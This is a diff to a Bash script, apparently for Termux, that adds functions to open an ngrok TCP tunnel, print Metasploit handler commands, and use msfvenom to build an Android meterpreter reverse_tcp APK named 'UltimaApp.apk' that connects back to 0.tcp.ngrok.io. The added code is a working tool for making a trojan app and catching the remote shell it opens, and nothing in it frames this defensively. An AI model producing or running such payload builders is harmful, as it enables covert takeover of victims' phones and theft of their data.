@@ -32,10 +32,36 @@ ip=$(ifconfig wlan0 | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v 255)
 printf "$ip" 
 } 
 
+
 function up {
 pkg update -y
 pkg upgrade -y
 }
+
+
+function sess1 {
+ngrok tcp 5555
+}
+function sess2 {
+printf "
+
+===============================
+msfconsole
+use exploit/multi/handler
+set  payload android/meterpreter/reverse_tcp
+set LHOST  localhost
+set LPORT 5555
+exploit
+
+===============================
+"
+}
+function sess3 {
+read -p "puerto: " puerto
+msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$puerto R > /sdcard/download/UltimaApp.apk
+} 
+
+
 
 ip=$(ifconfig wlan0 | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v 255)
 
